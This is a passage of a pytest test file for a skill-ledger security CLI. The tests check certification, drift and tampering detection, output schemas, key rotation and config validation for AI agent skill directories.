            {"rule": "ok", "level": "pass", "message": "pass"},
        ],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    # Cause drift
    (skill / "orig.txt").write_text("MODIFIED")

    r = run_skill_ledger(["status"], env_extra=env)
    assert r.returncode == 0
    out = parse_json_output(r.stdout)
    assert (
        out["skills"]["health"] == "attention"
    ), f"Expected health 'attention' after drift: {out['skills']}"


# ── Group 8: reserved commands & edge cases ───────────────────────────────


def test_rotate_keys_not_implemented(ws: Workspace) -> None:
    """rotate-keys fails explicitly without changing the isolated key store."""
    key_dir = ws.xdg_data / "agent-sec" / "skill-ledger"
    before = snapshot_file_tree(key_dir)
    keyring_existed = (key_dir / "keyring").is_dir()
    assert {"key.enc", "key.pub"}.issubset(before)

    r = run_skill_ledger(["rotate-keys"], env_extra=ws.env())
    assert r.returncode == 1, f"exit {r.returncode}: {r.stderr}"
    assert r.stdout == ""
    assert r.stderr == (
        "Error: rotate-keys is not implemented; no keys were changed.\n"
    )
    assert snapshot_file_tree(key_dir) == before
    assert (key_dir / "keyring").is_dir() is keyring_existed

    help_result = run_skill_ledger(["rotate-keys", "--help"], env_extra=ws.env())
    assert help_result.returncode == 0, help_result.stderr
    assert "not implemented" in strip_ansi(help_result.stdout).lower()


def test_list_scanners(ws):
    """list-scanners → exit 0, JSON with default scanners."""
    r = run_skill_ledger(["list-scanners"], env_extra=ws.env())
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert "scanners" in out, f"Expected 'scanners' key in JSON output: {out}"
    names = [s["name"] for s in out["scanners"]]
    assert "skill-vetter" in names, f"Expected skill-vetter in scanners: {names}"
    assert "code-scanner" in names, f"Expected code-scanner in scanners: {names}"
    assert "static-scanner" in names, f"Expected static-scanner in scanners: {names}"
    by_name = {s["name"]: s for s in out["scanners"]}
    assert by_name["code-scanner"]["autoInvocable"] is True
    assert by_name["static-scanner"]["autoInvocable"] is True
    assert by_name["skill-vetter"]["autoInvocable"] is False


def test_certify_empty_skill_dir(ws):
    """Certify a skill dir with no SKILL.md → exit 1, status=error."""
    skill = ws.skills_dir / "empty-skill"
    skill.mkdir(parents=True, exist_ok=True)
    env = ws.env()

    r = run_skill_ledger(["certify", str(skill)], env_extra=env)
    assert r.returncode == 1, f"expected exit 1 for empty dir, got {r.returncode}"


# ── Group 9: SKILL.md contract assertions ────────────────────────────────
#
# These tests verify that the exact CLI commands, flags, output fields, and
# path conventions referenced in SKILL.md work as documented.  They form the
# contract between the Skill definition (prompt) and the CLI implementation.


def test_contract_help_available(ws):
    """Step 0.1: `agent-sec-cli skill-ledger --help` → exit 0."""
    r = run_skill_ledger(["--help"], env_extra=ws.env())
    assert r.returncode == 0, f"--help returned {r.returncode}: {r.stderr}"
    assert (
        "skill-ledger" in r.stdout.lower()
    ), f"Expected 'skill-ledger' in help output: {r.stdout[:200]}"
    assert "init" in r.stdout
    assert "scan" in r.stdout
    assert "certify" in r.stdout
    assert "list-scanners" in r.stdout
    assert "rotate-keys" in r.stdout


def test_contract_certify_help_is_findings_only(ws):
    """certify help exposes external findings import options only."""
    r = run_skill_ledger(["certify", "--help"], env_extra=ws.env())
    assert r.returncode == 0, f"certify --help returned {r.returncode}: {r.stderr}"
    help_text = strip_ansi(r.stdout)
    assert "--findings" in help_text
    assert "--delete-findings" in help_text
    assert "--scanner-version" in help_text
    assert "--scanners" not in help_text
    assert "--all" not in help_text


def test_contract_init_empty_passphrase_env(ws):
    """Step 0.2: SKILL_LEDGER_PASSPHRASE=\"\" → passphrase-free init.

    This is the exact invocation SKILL.md uses for first-time auto-init.
    """
    alt_data = ws.root / "contract_keys"
    alt_data.mkdir()
    env = ws.env(
        {
            "XDG_DATA_HOME": str(alt_data),
            "SKILL_LEDGER_PASSPHRASE": "",  # empty string, NOT absent
        }
    )
    r = run_skill_ledger(["init", "--no-baseline"], env_extra=env)
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)["key"]
    assert (
        out.get("encrypted") is False
    ), f"Empty passphrase should produce unencrypted keys, got {out}"

    # Step 0.2 also checks: ls ~/.local/share/agent-sec/skill-ledger/key.pub
    key_pub = Path(alt_data) / "agent-sec" / "skill-ledger" / "key.pub"
    assert key_pub.exists(), f"key.pub not at expected path: {key_pub}"


def test_contract_check_output_schema(ws):
    """Step 0.4: check output is JSON with `status` field for every outcome.

    SKILL.md parses `status` from JSON output to build the triage table.
    This test verifies the contract across all reachable statuses.
    """
    env = ws.env()

    # status: none (fresh skill)
    skill_none = make_skill(ws.skills_dir, "schema-none", {"a.txt": "a"})
    r = run_skill_ledger(["check", str(skill_none)], env_extra=env)
    out = parse_json_output(r.stdout)
    assert "status" in out, f"Missing 'status' field for none: {out}"
    assert out["status"] == "none"

    # status: pass (after certify)
    findings = write_findings_file(
        ws.fixtures,
        "schema-p.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    run_skill_ledger(
        ["certify", str(skill_none), "--findings", str(findings)], env_extra=env
    )
    r = run_skill_ledger(["check", str(skill_none)], env_extra=env)
    out = parse_json_output(r.stdout)
    assert "status" in out, f"Missing 'status' field for pass: {out}"
    assert out["status"] == "pass"

    # status: drifted (file changed) — also verify diff fields
    (skill_none / "new.txt").write_text("new")
    r = run_skill_ledger(["check", str(skill_none)], env_extra=env)
    out = parse_json_output(r.stdout)
    assert "status" in out, f"Missing 'status' field for drifted: {out}"
    assert out["status"] == "drifted"
    for diff_key in ("added", "removed", "modified"):
        assert (
            diff_key in out
        ), f"drifted output missing '{diff_key}' — SKILL.md Step 0.4 needs this: {out}"


def test_contract_certify_explicit_scanner_flags(ws):
    """Phase 2.1: certify with explicit --scanner and --scanner-version flags.

    SKILL.md invocation:
      agent-sec-cli skill-ledger certify <DIR> \\
        --findings ... --scanner skill-vetter

    --scanner-version is optional (defaults to 'unknown' if omitted).
    This test verifies that explicit values are accepted.
    """
    skill = make_skill(ws.skills_dir, "contract-flags", {"run.sh": "echo hi"})
    env = ws.env()

    findings = write_findings_file(
        ws.fixtures,
        "flags.json",
        [{"rule": "r1", "level": "pass", "message": "ok"}],
    )
    r = run_skill_ledger(
        [
            "certify",
            str(skill),
            "--findings",
            str(findings),
            "--scanner",
            "skill-vetter",
            "--scanner-version",
            "0.1.0",
        ],
        env_extra=env,
    )
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out.get("scanStatus") == "pass"


def test_contract_certify_output_fields(ws):
    """Phase 2.2: certify output JSON contains versionId and scanStatus.

    SKILL.md parses exactly these two fields to build the final summary table.
    """
    skill = make_skill(ws.skills_dir, "contract-output", {"data.py": "x = 1"})
    env = ws.env()

    findings = write_findings_file(
        ws.fixtures,
        "out.json",
        [{"rule": "r1", "level": "warn", "message": "caution"}],
    )
    r = run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)],
        env_extra=env,
    )
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)

    assert (
        "versionId" in out
    ), f"Missing 'versionId' — SKILL.md Phase 2.2 needs this: {out}"
    assert (
        "scanStatus" in out
    ), f"Missing 'scanStatus' — SKILL.md Phase 2.2 needs this: {out}"

    # versionId format: v + 6 digits (e.g. v000001)
    vid = out["versionId"]
    assert len(vid) == 7, f"versionId length should be 7 (vNNNNNN), got '{vid}'"
    assert vid[0] == "v", f"versionId should start with 'v', got '{vid}'"
    assert vid[1:].isdigit(), f"versionId suffix should be digits, got '{vid}'"

    # scanStatus must be one of the 4 documented values
    assert out["scanStatus"] in (
        "pass",
        "warn",
        "deny",
        "none",
    ), f"Unexpected scanStatus '{out['scanStatus']}' — SKILL.md documents pass/warn/deny/none"


def test_contract_manifest_path(ws):
    """Phase 2.3: after certify, manifest exists at <SKILL_DIR>/.skill-meta/latest.json."""
    skill = make_skill(ws.skills_dir, "contract-path", {"f.txt": "content"})
    env = ws.env()

    findings = write_findings_file(
        ws.fixtures,
        "path.json",
        [{"rule": "r1", "level": "pass", "message": "ok"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)],
        env_extra=env,
    )

    latest = skill / ".skill-meta" / "latest.json"
    assert latest.exists(), (
        f"Manifest not at expected path — SKILL.md Phase 2.3 references "
        f"<SKILL_DIR>/.skill-meta/latest.json: {list(skill.rglob('*'))}"
    )

    # Verify it's valid JSON with expected fields
    data = json.loads(latest.read_text())
    assert "versionId" in data
    assert "fileHashes" in data
    assert "scanStatus" in data
    assert "signature" in data


def test_contract_check_status_values_complete(ws):
    """SKILL.md Step 0.4 triage table lists 6 statuses. Verify all are reachable.

    Statuses: none, pass, drifted, warn, deny, tampered.
    """
    env = ws.env()
    observed: set[str] = set()

    # none
    s = make_skill(ws.skills_dir, "sv-none", {"x.txt": "x"})
    r = run_skill_ledger(["check", str(s)], env_extra=env)
    observed.add(parse_json_output(r.stdout)["status"])

    # pass
    fp = write_findings_file(
        ws.fixtures,
        "sv-pass.json",
        [{"rule": "r", "level": "pass", "message": "ok"}],
    )
    run_skill_ledger(["certify", str(s), "--findings", str(fp)], env_extra=env)
    r = run_skill_ledger(["check", str(s)], env_extra=env)
    observed.add(parse_json_output(r.stdout)["status"])

    # drifted
    (s / "x.txt").write_text("changed")
    r = run_skill_ledger(["check", str(s)], env_extra=env)
    observed.add(parse_json_output(r.stdout)["status"])

    # warn
    sw = make_skill(ws.skills_dir, "sv-warn", {"w.txt": "w"})
    fpw = write_findings_file(
        ws.fixtures,
        "sv-warn.json",
        [{"rule": "r", "level": "warn", "message": "w"}],
    )
    run_skill_ledger(["certify", str(sw), "--findings", str(fpw)], env_extra=env)
    r = run_skill_ledger(["check", str(sw)], env_extra=env)
    observed.add(parse_json_output(r.stdout)["status"])

    # deny
    sd = make_skill(ws.skills_dir, "sv-deny", {"d.txt": "d"})
    fpd = write_findings_file(
        ws.fixtures,
        "sv-deny.json",
        [{"rule": "r", "level": "deny", "message": "d"}],
    )
    run_skill_ledger(["certify", str(sd), "--findings", str(fpd)], env_extra=env)
    r = run_skill_ledger(["check", str(sd)], env_extra=env)
    observed.add(parse_json_output(r.stdout)["status"])

    # tampered
    st = make_skill(ws.skills_dir, "sv-tamper", {"t.txt": "t"})
    fpt = write_findings_file(
        ws.fixtures,
        "sv-t.json",
        [{"rule": "r", "level": "pass", "message": "ok"}],
    )
    run_skill_ledger(["certify", str(st), "--findings", str(fpt)], env_extra=env)
    latest = st / ".skill-meta" / "latest.json"
    data = json.loads(latest.read_text())
    data["scanStatus"] = "deny"  # tamper without re-hashing
    latest.write_text(json.dumps(data))
    r = run_skill_ledger(["check", str(st)], env_extra=env)
    observed.add(parse_json_output(r.stdout)["status"])

    expected = {"none", "pass", "drifted", "warn", "deny", "tampered"}
    assert observed == expected, (
        f"Not all SKILL.md triage statuses are reachable.\n"
        f"  Expected: {expected}\n  Observed: {observed}\n"
        f"  Missing:  {expected - observed}"
    )


# ── Group 10: Key rotation ────────────────────────────────────────────────


def test_key_rotation_old_sigs_verifiable(ws):
    """After init --no-baseline --force-keys, old signatures must still pass `check`.

    The old public key should be archived into the keyring so that
    `verify()` can fall back to it for manifests signed with the
    previous key.
    """
    env = ws.env()

    # --- Sign a skill with the *original* key ---
    s = make_skill(ws.skills_dir, "rotate-test", {"a.txt": "a"})
    fp = write_findings_file(
        ws.fixtures,
        "rotate.json",
        [{"rule": "r", "level": "pass", "message": "ok"}],
    )
    r = run_skill_ledger(["certify", str(s), "--findings", str(fp)], env_extra=env)
    assert r.returncode == 0, f"certify failed: {r.stderr}"

    # Capture the old key fingerprint from the public key file
    pub_path = Path(env["XDG_DATA_HOME"]) / "agent-sec" / "skill-ledger" / "key.pub"
    old_fp = "sha256:" + hashlib.sha256(pub_path.read_bytes()).hexdigest()

    # check passes with original key
    r = run_skill_ledger(["check", str(s)], env_extra=env)
    out = parse_json_output(r.stdout)
    assert out["status"] == "pass", f"Expected pass before rotation, got {out}"

    # --- Rotate the key ---
    r = run_skill_ledger(["init", "--no-baseline", "--force-keys"], env_extra=env)
    assert r.returncode == 0, f"init --no-baseline --force-keys failed: {r.stderr}"
    new_fp = parse_json_output(r.stdout)["key"]["fingerprint"]
    assert (
        new_fp != old_fp
    ), f"Key rotation must produce a different fingerprint: old={old_fp}, new={new_fp}"
    assert new_fp.startswith("sha256:"), f"Fingerprint format unexpected: {new_fp}"

    # --- Old manifest must still verify via keyring fallback ---
    r = run_skill_ledger(["check", str(s)], env_extra=env)
    out = parse_json_output(r.stdout)
    # The skill files haven't changed, so status should NOT be tampered.
    # It may be 'pass' (keyring verified) or 'drifted' if something else
    # changed, but it must NOT be 'tampered'.
    assert out["status"] != "tampered", (
        f"Old signature should still verify after key rotation, "
        f"but got status={out['status']}. Keyring archival may be broken."
    )
    # Specifically expect 'pass' since files are unchanged:
    assert (
        out["status"] == "pass"
    ), f"Expected 'pass' for unchanged skill after key rotation, got '{out['status']}'"


@pytest.mark.parametrize("initialized", [False, True])
def test_unimplemented_rotation_leaves_keys_unchanged(tmp_path, initialized):
    env = {
        "XDG_DATA_HOME": str(tmp_path / "data"),
        "XDG_CONFIG_HOME": str(tmp_path / "config"),
    }
    if initialized:
        result = run_skill_ledger(["init", "--no-baseline"], env_extra=env)
        assert result.returncode == 0, result.stderr
    key_dir = tmp_path / "data" / "agent-sec" / "skill-ledger"
    before = snapshot_file_tree(key_dir)
    existed = key_dir.exists()
    result = run_skill_ledger(["rotate-keys"], env_extra=env)
    assert result.returncode == 1
    assert result.stdout == ""
    assert (
        result.stderr
        == "Error: rotate-keys is not implemented; no keys were changed.\n"
    )
    assert snapshot_file_tree(key_dir) == before
    assert key_dir.exists() == existed


@pytest.mark.parametrize("command", ["show", "export"])
def test_cli_rejects_invalid_policy_without_writes(tmp_path, command):
    policy = "invalid"
    skill = make_skill(tmp_path / "skills", "demo", {})
    env = {
        "XDG_DATA_HOME": str(tmp_path / "data"),
        "XDG_CONFIG_HOME": str(tmp_path / "config"),
    }
    args = [command, str(skill), "--policy", policy]
    if command == "export":
        args += ["--output", str(tmp_path / "export")]
    before = snapshot_file_tree(tmp_path)
    result = run_skill_ledger(args, env_extra=env)
    assert result.returncode == 2
    error = strip_ansi(result.stderr)
    assert policy in error and "pass_warn_only" in error
    assert snapshot_file_tree(tmp_path) == before
    assert not (tmp_path / "export").exists()


@pytest.mark.parametrize("initialized", [False, True])
def test_invalid_config_fails_before_cli_mutations(tmp_path, initialized):
    invalid_config = {"activationPolicy": "invalid"}
    skill = make_skill(tmp_path / "skills", "demo", {})
    env = {
        "XDG_DATA_HOME": str(tmp_path / "xdg_data"),
        "XDG_CONFIG_HOME": str(tmp_path / "xdg_config"),
    }
    if initialized:
        result = run_skill_ledger(["scan", str(skill)], env_extra=env)
        assert result.returncode == 0, result.stderr
    findings = write_findings_file(tmp_path, "findings.json", [])
    write_skill_ledger_config(tmp_path, invalid_config)
    key_dir = tmp_path / "xdg_data" / "agent-sec" / "skill-ledger"
    config_path = tmp_path / "xdg_config" / "agent-sec" / "skill-ledger" / "config.json"
    protected = [key_dir, skill, config_path.parent]
    before = [snapshot_file_tree(path) for path in protected]
    for args in (
        ["init", "--no-baseline", "--force-keys"],
        ["scan", str(skill)],
        ["certify", str(skill), "--findings", str(findings)],
        ["decide", str(skill), "--action", "block"],
        ["show", str(skill)],
        ["export", str(skill), "--output", str(tmp_path / "export")],
    ):
        result = run_skill_ledger(args, env_extra=env)
        assert result.returncode == 1, (args, result.stderr)
        assert str(config_path) in result.stderr
        assert "activationPolicy" in result.stderr
        assert [snapshot_file_tree(path) for path in protected] == before
        assert not (tmp_path / "export").exists()


def test_certify_custom_external_scanner(tmp_path):
    env = {
        "XDG_DATA_HOME": str(tmp_path / "xdg_data"),
        "XDG_CONFIG_HOME": str(tmp_path / "xdg_config"),
    }
    skill = make_skill(tmp_path / "skills", "demo", {})
    write_skill_ledger_config(
        tmp_path,
        {
            "scanners": [
                {
                    "name": "team-review",
                    "type": "skill",
                    "parser": "findings-array",
                    "enabled": True,
                }
            ]
        },
    )
    findings = write_findings_file(tmp_path, "findings.json", [])
    result = run_skill_ledger(
        [
            "certify",
            str(skill),
            "--scanner",
            "team-review",
            "--findings",
            str(findings),
        ],
        env_extra=env,
    )
    assert result.returncode == 0, result.stderr
    manifest = read_latest_manifest(skill)
    assert [entry["scanner"] for entry in manifest["scans"]] == ["team-review"]
    result = run_skill_ledger(
        ["audit", str(skill), "--verify-snapshots"], env_extra=env
    )
    assert result.returncode == 0, result.stderr
